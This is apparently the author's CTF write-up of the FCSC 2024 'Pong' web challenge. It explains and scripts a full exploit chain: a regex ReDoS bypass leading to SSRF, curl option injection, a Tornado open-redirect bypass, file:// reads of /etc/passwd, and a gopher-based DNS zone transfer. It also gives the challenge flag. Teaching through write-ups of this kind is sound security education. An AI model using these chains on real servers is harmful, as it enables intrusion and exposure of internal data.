---
source: kevin-mizu
source_url: https://mizu.re/post/pong
title: "Pong | mizu.re"
description: "Pong"
---

_keyboard\_arrow\_up_

title: Pong

date: Apr 13, 2024

tags: [Writeup](https://mizu.re/tag/Writeup) [FCSC2024](https://mizu.re/tag/FCSC2024) [Web](https://mizu.re/tag/Web) [SSRF](https://mizu.re/tag/SSRF)

# Pong

![](https://mizu.re/articles/writeups/FCSC2024/pong/images/logo-fcsc2024.png)

* * *

Difficulty: 490 points \| 4 solves

Description: Ping.

Link: [Hackropole](https://hackropole.fr/fr/challenges/web/fcsc2024-web-pong/).

Author: [Me](https://twitter.com/kevin_mizu)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/pong#recon)
- [⏩ Finding the SSRF](https://mizu.re/post/pong#finding-the-ssrf)
- [🚗 Taking control over the protocol](https://mizu.re/post/pong#taking-control-over-the-protocol)
- [🔙 Finding an Open Redirect](https://mizu.re/post/pong#finding-an-open-redirect)
- [🔎 Finding the DNS IP](https://mizu.re/post/pong#finding-the-dns-ip)
- [🗄️ SSRF to AXFR (DNS Zone Transfer)](https://mizu.re/post/pong#ssrf-to-axfr)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/pong#chain)

## 🕵️ Recon

To my great surprise, this challenge turned out to be the least flagged one I've created for the FCSC. On the homepage, it features a simple pong game:

![home.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/home.png)

The challenge frontend source code was quite simple:

- /src/frontend/src/index.php

```php
$_GET["game"] = $_GET["game"] ?? "pong";
if (preg_match("/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/", $_GET["game"])) {
    echo "403 Forbidden!";
    exit();
}

$ch = curl_init();
$options = [ CURLOPT_URL => "http://" . $_GET["game"] . ".fcsc2024.fr:5000" ];

if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1" && isset($_GET["options"])) {
    $options += $_GET["options"];
}

curl_setopt_array($ch, $options);
curl_exec($ch);
```

The complexity of the challenge lay in the number of services that needed to be exploited. Below is the provided docker-compose:

- /docker-compose.yml

```yaml
version: "3"
services:
  pong-frontend:
    build: ./src/frontend/
    ports:
      - "8000:80"
    depends_on:
      - pong-internal-dns
    dns:
      - 10.0.0.3 # not the same on the remote instance
    networks:
      pong-network:
        ipv4_address: 10.0.0.2 # not the same on the remote instance

  pong-internal-dns:
    build: ./src/dns/
    networks:
      pong-network:
        ipv4_address: 10.0.0.3 # not the same on the remote instance
    environment:
      - FLAG_DOMAIN=fake_domain
      - FRONTEND_IP=10.0.0.2 # not the same on the remote instance
      - BACKEND_IP=10.0.0.4 # not the same on the remote instance
      - FLAG_IP=10.0.0.5 # not the same on the remote instance

  pong-backend:
    build: ./src/backend/
    depends_on:
      - pong-internal-dns
    dns:
      - 10.0.0.3 # not the same on the remote instance
    networks:
      pong-network:
        ipv4_address: 10.0.0.4 # not the same on the remote instance

  pong-flag:
    build: ./src/flag/
    depends_on:
      - pong-internal-dns
    dns:
      - 10.0.0.3 # not the same on the remote instance
    networks:
      pong-network:
        ipv4_address: 10.0.0.5 # not the same on the remote instance
    environment:
      - FLAG=FCSC{flag_placeholder}
      - FLAG_DOMAIN=fake_domain

networks:
  pong-network:
    ipam:
      config:
        - subnet: 10.0.0.0/8
```

It's important to note that the only the pong-frontend is exposed and the internal IPs and domains differ on the remote instance. The challenge incorporates a total of 4 services:

- pong-frontend: The main PHP application we just described.
- pong-internal-dns: A custom internal DNS server used to access other services.
- pong-backend: The source code for the Pong game.
- pong-flag: The target service that we need to reach to obtain the flag.

The pong-backend Docker is developed in Python using the Tornado framework:

- /src/backend/src/app.py

```py
tornado.web._unicode = lambda value: value.decode("utf-8", "replace")

def make_app():
    return tornado.web.Application([\
        (r"/?(.*)", tornado.web.StaticFileHandler, { "path": "public", "default_filename": "index.html" }),\
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(5000)
    tornado.ioloop.IOLoop.current().start()
```

The pong-internal-dns Docker is developed in Python using dnslib and is exposed on both TCP and UDP (an important detail that will be utilized later):

- /src/dns/src/dns\_server.py

```python
DOMAINS = {
    "frontend.fcsc2024.fr.": environ["FRONTEND_IP"],
    "pong.fcsc2024.fr.": environ["BACKEND_IP"],
    f"{environ['FLAG_DOMAIN']}.fcsc2024.fr.": environ["FLAG_IP"]
}

# ...

def run_server(protocol):
    resolver = LocalDNS()
    server = DNSServer(resolver, address="0.0.0.0", port=53, tcp=(protocol == "TCP"))
    server.start()

if __name__ == "__main__":
    threading.Thread(target=run_server, args=("TCP",)).start()
    threading.Thread(target=run_server, args=("UDP",)).start()
```

Finally, the pong-flag is written in Node.js with a straightforward Express application, which can only be accessed using the correct Host header:

- /src/flag/src/app.js

```js
app.use((req, res, next) => {
    if (req.headers["host"] !== `${process.env.FLAG_DOMAIN}.fcsc2024.fr:${PORT}`) {
        res.send("403 Forbidden!");
        return;
    }
    res.send(process.env.FLAG);
})

app.listen(PORT, () => {
    console.log(`Pong running on port ${PORT}`);
});
```

Given all this information, it’s evident that we need to abuse an SSRF to communicate with the DNS service. This will allow us to retrieve the domain name of the flag service and, consequently, the flag itself.

## ⏩ Finding the SSRF

As mentioned earlier, the first step is to find a way to achieve an SSRF. Examining the PHP source code, we find that a regex restricts (must match a-z and . chars) communication to any service other than those at .fcsc2024.fr:5000:

- /src/frontend/src/index.php

```php
$_GET["game"] = $_GET["game"] ?? "pong";
if (preg_match("/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/", $_GET["game"])) {
    echo "403 Forbidden!";
    exit();
}

$ch = curl_init();
$options = [ CURLOPT_URL => "http://" . $_GET["game"] . ".fcsc2024.fr:5000" ];
```

Additionally, if we manage to access the frontend service from 127.0.0.1 (essentially the service itself), we can control the options that are passed to curl.

```php
if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1" && isset($_GET["options"])) {
    $options += $_GET["options"];
}

curl_setopt_array($ch, $options);
curl_exec($ch);
```

> How could the regex be bypassed?

In fact, upon consulting the PHP documentation, it's clear that preg\_match returns a false value in case of a failure: ( [link](https://www.php.net/manual/en/function.preg-match.php#refsect1-function.preg-match-returnvalues))

![redos_01.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/redos_01.png)

> How this could be possible?

This is because PHP uses the [PRCE library](http://www.pcre.org/) for all preg\_ functions and defines a default maximum recursion depth of 100.000: ( [link](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit))

![redos_02.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/redos_02.png)

_Another challenge writeup about this can be found [here](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)._

Knowing this, it is possible to force the regex to execed more than 100.000 recursions which will cause a ReDOS and make preg\_match returning false:

![redos.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/redos.png)

Running this agains the challenge using aaaaaaaaaa.aaaaaaaaaa.aaaaaaaaaa.aaaaaaaaaa.aaaaaaaaaa.aaaaaaaaaa.aaaaaaaaaa@127.0.0.1/ we can confirm the SSRF 🎉

![ssrf.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/ssrf.png)

## 🚗 Taking control over the protocol

At this stage, we have full control over the following parts of the URL:

![URL.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/URL.png)

_The username must contain the ReDOS payload, and the anchor must include the fcsc2024 domain._

Therefore, to gain more information about the system, either through file reading or interaction with the DNS Server, we need to control the request protocol. To achieve this, we must partially control the curl options by accessing the frontend application through 127.0.0.1.

```php
if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1" && isset($_GET["options"])) {
    $options += $_GET["options"];
}

curl_setopt_array($ch, $options);
```

If we take a look at the PHP documentation, here are 2 interesting curl options that could be used within the context of the challenge: ( [link](https://www.php.net/manual/en/function.curl-setopt.php))

- CURLOPT\_FOLLOWLOCATION: Force curl to follow redirection (default false).
- CURLOPT\_REDIR\_PROTOCOLS \+ CURLPROTO\_ALL: Allows all wrappers to be used in case of redirection.

_Some people haven't used the exact same options, but it doesn't change the solution in the end._

Thanks to this configuration, in case of a redirect, we would gain full control over the URL passed to curl. This allows us to use protocols such as file:// or gopher:// 🔥

## 🔙 Finding an Open Redirect

At this point, we might think we just need to use the SSRF to reach a controlled server that responds with a 302 status code to fully control the protocol. However, this won't be possible. Why? Because the services do not have internet access :)

> How could we find an open redirect in such lightweight services?

This was likely the most challenging part of the challenge. If we take a step back, the backend-pong service is the only one that hasn't been exploited yet:

- pong-frontend: ReDOS + SSRF.
- pong-internal-dns: Retrieve the pong-flag domain name.
- pong-backend: ???
- pong-flag: Get the flag.

Therefore, it becomes the most logical candidate for finding an open redirect. As a reminder, here is the source code of the service:

```python
tornado.web._unicode = lambda value: value.decode("utf-8", "replace")

def make_app():
    return tornado.web.Application([\
        (r"/?(.*)", tornado.web.StaticFileHandler, { "path": "public", "default_filename": "index.html" }),\
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(5000)
    tornado.ioloop.IOLoop.current().start()
```

If we search for tornado open redirect, we can find: ( [advisory](https://github.com/advisories/GHSA-hj3f-6gcp-jg8j))

![tornado_opr_01.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/tornado_opr_01.png)

This may not seem interesting since it was fixed in 2023 and the challenge uses the latest version. However, let’s examine the fix: ( [commit](https://github.com/tornadoweb/tornado/commit/32ad07c54e607839273b4e1819c347f5c8976b2f))

![tornado_opr_02.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/tornado_opr_02.png)

As we can see, it only blocks redirects if the path starts with //. This means that if it begins with a wrapper, it will still be considered a valid redirect value :)

As far as I know, there was no available proof of concept or detailed information on how to exploit this open redirect at the time of the CTF. Therefore, we need to delve into the Tornado source code to determine how to access the vulnerability.

- tornado \> /tornado/web.py ( [permalink](https://github.com/tornadoweb/tornado/blob/f399f40fde0ae1b130646db783a6f79cc59231b2/tornado/web.py#L2882C1-L2898C79))

```python
def validate_absolute_path(self, root: str, absolute_path: str) -> Optional[str]:
    # ...
    root = os.path.abspath(root) # RESOLVE ROOT PATH
    # ...

    if not (absolute_path + os.path.sep).startswith(root): # CHECK IF TARGET PATH STARTS WITH ROOT PATH
        raise HTTPError(403, "%s is not in root static directory", self.path)

    if os.path.isdir(absolute_path) and self.default_filename is not None: # TARGET PATH MUST BE A FOLDER
        # ...
        if not self.request.path.endswith("/"): # IMPORTANT
            if self.request.path.startswith("//"):
                # ...
                raise HTTPError(
                    403, "cannot redirect path with two initial slashes"
                )
            self.redirect(self.request.path + "/", permanent=True) # IF EVERYTHING GOOD USE THE PATH
            return None
```

- tornado \> /tornado/web.py ( [permalink](https://github.com/tornadoweb/tornado/blob/f399f40fde0ae1b130646db783a6f79cc59231b2/tornado/web.py#L2688))

```python
class StaticFileHandler(RequestHandler):
    # ...
    async def get(self, path: str, include_body: bool = True) -> None:
        # ...
        absolute_path = self.get_absolute_path(self.root, self.path) # RESOLVE ABS PATH
        self.absolute_path = self.validate_absolute_path(self.root, absolute_path) # HERE
```

Breaking down what happens:

- The vulnerable server must uses StaticFileHandler.

- The vulnerability occurs in GET request to it.

- The StaticFileHandler path \+ the HTTP Path must starts with the StaticFileHandler path (meaning no ../ is possible).

- The target path must be a folder and doesn't end with a /.

- The vulnerable server must use StaticFileHandler.

- The vulnerability occurs during a GET request to it.

- The path</span<> defined in StaticFileHandler</span<>, combined with the HTTP path, must start with the StaticFileHandler path which means no ../ is possible.

- The target path must be a folder and not end with a /.


Fortunately for us, the challenge route path does not require the path to start with a / in the tornado.web.StaticFileHandler router:

- /src/backend/src/app.py

```python
def make_app():
    return tornado.web.Application([\
        (r"/?(.*)", tornado.web.StaticFileHandler, { "path": "public", "default_filename": "index.html" }), # /?(.*) :)\
    ])
```

In addition, the challenge exposes the public folder, within which lies an js folder ready for the exploitation 🥳
![js_folder.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/js_folder.png)

The last problem arises from the necessity to resolve the folder path to match /usr/app/public/js. To address this, we can leverage the behavior of Tornado, which processes the raw path and resolves it, causing confusion between curl and Tornado itself. This can be accomplished this way:

- Basic redirection:

![red_01.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/red_01.png)

- With path traversal:

![red_02.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/red_02.png)

- Using file:///#../:

![red_03.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/red_03.png)

As we can see, we finally achieve complete control over the redirection 🔥

This can be chained with the curl options + SSRF to get a local file read:

```python
import sys
from urllib.parse import quote
from requests import get

CHALL_DOMAIN = "https://pong.france-cybersecurity-challenge.fr/"

# CURL OPTIONS
CURLOPT_FOLLOWLOCATION = 52
CURLOPT_REDIR_PROTOCOLS = 182
CURLPROTO_ALL = -1
CURLOPT_CUSTOMREQUEST = 10036

# EXPLOIT OPTIONS
sub_request_params = {
    "game": "pong",
    f"options[{CURLOPT_FOLLOWLOCATION}]": "true",
    f"options[{CURLOPT_REDIR_PROTOCOLS}]": str(CURLPROTO_ALL),
    f"options[{CURLOPT_CUSTOMREQUEST}]": "GET file:///etc/passwd#/../../../../../../../../../../../../usr/app/public/js HTTP/1.1\r\nX-Header:"
}

# MAIN
if __name__ == "__main__":
    r = get(CHALL_DOMAIN, params={
        "game": "aaaaaaaaaa."*7 + "@127.0.0.1/?" + "".join([f"{k}={quote(v)}&" for k,v in sub_request_params.items()])
    })
    print(r.text)
```

![etc_passwd.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/etc_passwd.png)

## 🔎 Finding the DNS IP

With a fully exploitable SSRF allowing us control over the protocol, the next step is to locate the DNS IP for flag retrieval. This task has been accomplished through various methods:

- Using the default Docker DNS resolver IP: 127.0.0.53.
- Using the Docker name: pong-internal-dns.
- Reading the ARP table: /proc/net/arp.

Mine was to read the ARP table, but all solutions were fine.

## 🗄️ SSRF to AXFR (DNS Zone Transfer)

At this point, only the last step was left: we need to retrieve the pong-flag service dns name. In order to do that, the most logical way is to make a AXFR DNS query: ( [link](https://en.wikipedia.org/wiki/DNS_zone_transfer))

![AXFR.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/AXFR.png)

_It is important to understand that this is only possible because the DNS server respond on TCP, which is the transport protocol used by gopher:_

In order to craft a valid AXFR DNS query which will query for the fcsc2024.fr domain, several methodology could be employed:

- Sniffing the network while doing dig axfr fcsc2024.fr.
- Crafting you're own raw DNS packet.
- ...

I've opted to the second one as I already played with DNS packet in the past:

```python
dns_request = (
    b"\x01\x03\x03\x07" # BITMAP
    b"\x00\x01" # QCOUNT
    b"\x00\x00" # ANCOUNT
    b"\x00\x00" # NSCOUNT
    b"\x00\x00" # ARCOUNT

    b"\x08fcsc2024\x02fr\x00" # DNAME
    b"\x00\xFC" # QTYPE
    b"\x00\x01" # QCLASS
)
```

Using it on the DNS server and we get (37b9da922f6360e301faeff19bac866c1a042d4a is the flag server subdomain): 🔥

![gopher_dns.png](https://mizu.re/articles/writeups/FCSC2024/pong/images/gopher_dns.png)

The last step is to use this domain with the SSRF in order to get the flag 🥳

## 💥 TL/DR: Chain everything together

To summarize, we need to:

- Trigger a ReDOS on preg\_match to SSRF.
- Reach the localhost to manipulate curl options.
- Exploit an open redirect in Tornado's StaticFileHandler.
- Utilize it to control the SSRF protocol.
- Execute a gopher AXFR DNS query.
- Access the flag service with the correct domain to retrieve the flag.

```python
import sys
from urllib.parse import quote
from requests import get

if len(sys.argv) == 2:
    CHALL_DOMAIN = sys.argv[1]
    IP = "10.0.0.3"
    FLAG_DOMAIN = "fake_domain"
else:
    CHALL_DOMAIN = "https://pong.france-cybersecurity-challenge.fr/"
    IP = "10.222.147.250"
    FLAG_DOMAIN = "37b9da922f6360e301faeff19bac866c1a042d4a"

CHALL_DOMAIN = CHALL_DOMAIN.rstrip("/")

# CURL OPTIONS
CURLOPT_FOLLOWLOCATION = 52
CURLOPT_REDIR_PROTOCOLS = 182
CURLPROTO_ALL = -1
CURLOPT_CUSTOMREQUEST = 10036

# DNS AXFR QUERY
dns_request = (
    b"\x01\x03\x03\x07" # BITMAP
    b"\x00\x01" # QCOUNT
    b"\x00\x00" # ANCOUNT
    b"\x00\x00" # NSCOUNT
    b"\x00\x00" # ARCOUNT

    b"\x08fcsc2024\x02fr\x00" # DNAME
    b"\x00\xFC" # QTYPE
    b"\x00\x01" # QCLASS
)
file_read = "file:///proc/net/arp"
dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request # TCP packet

# EXPLOIT OPTIONS
dns_ssrf = f"gopher://{IP}:53/_{quote(dns_request)}"
sub_request_params = {
    "game": "pong",
    f"options[{CURLOPT_FOLLOWLOCATION}]": "true",
    f"options[{CURLOPT_REDIR_PROTOCOLS}]": str(CURLPROTO_ALL),
    f"options[{CURLOPT_CUSTOMREQUEST}]": "GET {SSRF}#/../../../../../../../../../../../../usr/app/public/js HTTP/1.1\r\nX-Header:"
}

# MAIN
if __name__ == "__main__":
    # Get ip configuration
    r = get(CHALL_DOMAIN, params={
        "game": "aaaaaaaaaa."*7 + "@127.0.0.1/?" + "".join([f"{k}={quote(v.replace('{SSRF}', file_read))}&" for k,v in sub_request_params.items()])
    })
    print(r.text)
    assert IP in r.text

    # AXFR DNS zone transfer
    r = get(CHALL_DOMAIN, params={
        "game": "aaaaaaaaaa."*7 + "@127.0.0.1/?" + "".join([f"{k}={quote(v.replace('{SSRF}', dns_ssrf))}&" for k,v in sub_request_params.items()])
    })
    print(r.content)
    assert FLAG_DOMAIN.encode() in r.content

    r = get(CHALL_DOMAIN, params={
        "game": "aaaaaaaaaa."*7 + f"@{FLAG_DOMAIN}.fcsc2024.fr:3000/"
    })
    print(r.text)
```

**Flag**: FCSC{d8af233176d6ca50598a48fc47d8cadeae37b3d35a641efc1ad7777c86fe28a9}

[_keyboard\_arrow\_left_ Twisty Python](https://mizu.re/post/twisty-python)

[CORS Playground _keyboard\_arrow\_right_](https://mizu.re/post/cors-playground)